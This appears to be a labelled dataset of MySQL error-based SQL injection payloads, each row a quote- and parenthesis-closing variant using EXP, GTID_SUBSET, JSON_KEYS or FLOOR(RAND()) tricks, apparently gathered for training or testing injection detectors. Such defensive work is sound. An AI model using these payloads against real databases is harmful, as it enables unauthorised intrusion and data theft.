"') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND ('ukIW' LIKE 'ukIW",1,1
"')) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND (('EOjG' LIKE 'EOjG",1,1
"'))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND ((('fhEj' LIKE 'fhEj",1,1
"%' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND 'USJU%'='USJU",1,1
"' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND 'ftQx' LIKE 'ftQx",1,1
""") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND (""hZRA""=""hZRA",1,1
""")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND ((""lSas""=""lSas",1,1
"""))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND (((""VHkE""=""VHkE",1,1
""" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND ""lCSX""=""lCSX",1,1
""") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND (""YSqN"" LIKE ""YSqN",1,1
""")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND ((""IjxS"" LIKE ""IjxS",1,1
"""))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND (((""JFSc"" LIKE ""JFSc",1,1
""" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND ""Mzmh"" LIKE ""Mzmh",1,1
" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- qTCh",1,1
" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))# Abac",1,1
"' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) OR 'FJuA'='zUnS",1,1
"') WHERE 4483=4483 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- qoQR",1,1
""") WHERE 6505=6505 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- BxKk",1,1
") WHERE 9042=9042 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- sVGF",1,1
"' WHERE 7343=7343 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- EUwK",1,1
""" WHERE 5844=5844 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- rDKY",1,1
" WHERE 9767=9767 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- UoWI",1,1
"'||(SELECT 0x45707661 WHERE 5272=5272 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)))||'",1,1
"'||(SELECT 0x4a774b52 FROM DUAL WHERE 3280=3280 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)))||'",1,1
"'+(SELECT 0x6a62524b WHERE 9785=9785 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)))+'",1,1
"||(SELECT 0x6e614345 FROM DUAL WHERE 2735=2735 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)))||",1,1
"||(SELECT 0x67634e54 WHERE 9392=9392 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)))||",1,1
"+(SELECT yhbS WHERE 4220=4220 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)))+",1,1
"+(SELECT 0x53427a53 WHERE 3032=3032 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)))+",1,1
"')) AS rQto WHERE 2010=2010 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- DTJb",1,1
""")) AS XlYH WHERE 7958=7958 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- bKBM",1,1
")) AS Xhne WHERE 1850=1850 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- oaHE",1,1
"') AS eGBK WHERE 6957=6957 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- vYgW",1,1
""") AS unyj WHERE 5173=5173 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- rXug",1,1
") AS AiHw WHERE 9077=9077 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- tYfu",1,1
"` WHERE 7903=7903 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- pXll",1,1
"`) WHERE 8573=8573 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))-- nhfd",1,1
"`=`` AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND ``=`",1,1
"""="""" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)) AND """"=""",1,1
"]-(SELECT 0 WHERE 6810=6810 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x)))|[",1,1
"' IN BOOLEAN MODE) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(6346=6346,1))),0x71766a7671,0x78))x))#",1,1
") AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- bImX",1,1
"') AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- EXog",1,1
"' AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- kIBH",1,1
""" AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- WzWr",1,1
") AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND (6087=6087",1,1
")) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND ((3464=3464",1,1
"))) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND (((7241=7241",1,1
" AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)",1,1
"') AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND ('dWKG'='dWKG",1,1
"')) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND (('eniu'='eniu",1,1
"'))) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND ((('bRLH'='bRLH",1,1
"' AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND 'psjS'='psjS",1,1
"') AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND ('fonJ' LIKE 'fonJ",1,1
"')) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND (('yklV' LIKE 'yklV",1,1
"'))) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND ((('iSIq' LIKE 'iSIq",1,1
"%' AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND 'FfJB%'='FfJB",1,1
"' AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND 'khMj' LIKE 'khMj",1,1
""") AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND (""gzjI""=""gzjI",1,1
""")) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND ((""FWVm""=""FWVm",1,1
"""))) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND (((""xuxG""=""xuxG",1,1
""" AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND ""rJMK""=""rJMK",1,1
""") AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND (""FDhB"" LIKE ""FDhB",1,1
""")) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND ((""CYgp"" LIKE ""CYgp",1,1
"""))) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND (((""BSeO"" LIKE ""BSeO",1,1
""" AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND ""Sbbt"" LIKE ""Sbbt",1,1
" AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- Eesj",1,1
" AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)# QkSX",1,1
"' AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) OR 'fnaO'='NPhR",1,1
"') WHERE 7991=7991 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- xnYG",1,1
""") WHERE 8424=8424 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- wRHT",1,1
") WHERE 1950=1950 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- hxvf",1,1
"' WHERE 3322=3322 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- OaHF",1,1
""" WHERE 7003=7003 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- pFFd",1,1
" WHERE 3993=3993 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- ipqG",1,1
"'||(SELECT 0x6c626448 WHERE 2443=2443 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204))||'",1,1
"'||(SELECT 0x67484245 FROM DUAL WHERE 5344=5344 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204))||'",1,1
"'+(SELECT 0x74556568 WHERE 7772=7772 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204))+'",1,1
"||(SELECT 0x6459656f FROM DUAL WHERE 2550=2550 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204))||",1,1
"||(SELECT 0x587a6271 WHERE 7832=7832 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204))||",1,1
"+(SELECT jvjU WHERE 6326=6326 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204))+",1,1
"+(SELECT 0x49736f6d WHERE 3440=3440 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204))+",1,1
"')) AS WgHu WHERE 6738=6738 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- siCs",1,1
""")) AS ZBPn WHERE 6113=6113 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- KRQs",1,1
")) AS iyQf WHERE 2775=2775 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- WXYF",1,1
"') AS EEag WHERE 7254=7254 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- WFMr",1,1
""") AS GYfv WHERE 6597=6597 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- AtSu",1,1
") AS BkwM WHERE 5123=5123 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- fDDB",1,1
"` WHERE 9063=9063 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- VheZ",1,1
"`) WHERE 7857=7857 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)-- sjVQ",1,1
"`=`` AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND ``=`",1,1
"""="""" AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204) AND """"=""",1,1
"]-(SELECT 0 WHERE 2098=2098 AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204))|[",1,1
"' IN BOOLEAN MODE) AND GTID_SUBSET(CONCAT(0x7171767871,(SELECT (ELT(6204=6204,1))),0x71766a7671),6204)#",1,1
") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- RxKk",1,1
"') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- GgoP",1,1
"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- kZMM",1,1
""" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- tixH",1,1
") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND (2814=2814",1,1
")) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND ((5615=5615",1,1
"))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND (((6502=6502",1,1
" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))",1,1
"') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND ('uGiR'='uGiR",1,1
"')) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND (('NLXd'='NLXd",1,1
"'))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND ((('eQSN'='eQSN",1,1
"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND 'HZvL'='HZvL",1,1
"') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND ('kgbG' LIKE 'kgbG",1,1
"')) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND (('zWHu' LIKE 'zWHu",1,1
"'))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND ((('Lkzd' LIKE 'Lkzd",1,1
"%' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND 'RYyE%'='RYyE",1,1
"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND 'kSeq' LIKE 'kSeq",1,1
""") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND (""fcrF""=""fcrF",1,1
""")) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND ((""zrvB""=""zrvB",1,1
"""))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND (((""fcTk""=""fcTk",1,1
""" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND ""wtBo""=""wtBo",1,1
""") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND (""EGcv"" LIKE ""EGcv",1,1
""")) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND ((""JCLp"" LIKE ""JCLp",1,1
"""))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND (((""MJIr"" LIKE ""MJIr",1,1
""" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND ""uWxQ"" LIKE ""uWxQ",1,1
" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- uAYq",1,1
" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))# ikun",1,1
"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) OR 'SKpI'='mXEy",1,1
"') WHERE 8980=8980 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- Hcrg",1,1
""") WHERE 1301=1301 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- iMoM",1,1
") WHERE 7447=7447 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- vNpA",1,1
"' WHERE 8817=8817 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- PExa",1,1
""" WHERE 5894=5894 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- KIWh",1,1
" WHERE 9858=9858 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- klHF",1,1
"'||(SELECT 0x50586557 WHERE 2410=2410 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))))||'",1,1
"'||(SELECT 0x46426447 FROM DUAL WHERE 1145=1145 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))))||'",1,1
"'+(SELECT 0x696c4f48 WHERE 3138=3138 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))))+'",1,1
"||(SELECT 0x43707665 FROM DUAL WHERE 1134=1134 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))))||",1,1
"||(SELECT 0x6e6b745a WHERE 6360=6360 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))))||",1,1
"+(SELECT Kiol WHERE 5086=5086 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))))+",1,1
"+(SELECT 0x49766b74 WHERE 2840=2840 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))))+",1,1
"')) AS WHbi WHERE 3830=3830 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- QXUN",1,1
""")) AS EsHz WHERE 1574=1574 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- dFYf",1,1
")) AS Vret WHERE 4261=4261 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- BrxT",1,1
"') AS lJTj WHERE 6594=6594 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- NYBd",1,1
""") AS hGNZ WHERE 3172=3172 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- qlcO",1,1
") AS tkmk WHERE 3147=3147 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- UHoI",1,1
"` WHERE 5192=5192 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- wmSA",1,1
"`) WHERE 7851=7851 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))-- lTng",1,1
"`=`` AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND ``=`",1,1
"""="""" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))) AND """"=""",1,1
"]-(SELECT 0 WHERE 1350=1350 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8))))|[",1,1
"' IN BOOLEAN MODE) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171767871,(SELECT (ELT(4749=4749,1))),0x71766a7671)) USING utf8)))#",1,1
") AND (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7171767871,(SELECT (ELT(8970=8970,1))),0x71766a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YmRF",1,1
"') AND (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7171767871,(SELECT (ELT(8970=8970,1))),0x71766a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- rPtL",1,1
"' AND (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7171767871,(SELECT (ELT(8970=8970,1))),0x71766a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- WKeH",1,1
""" AND (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7171767871,(SELECT (ELT(8970=8970,1))),0x71766a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JGRq",1,1
") AND (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7171767871,(SELECT (ELT(8970=8970,1))),0x71766a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (8151=8151",1,1
")) AND (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7171767871,(SELECT (ELT(8970=8970,1))),0x71766a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((8334=8334",1,1
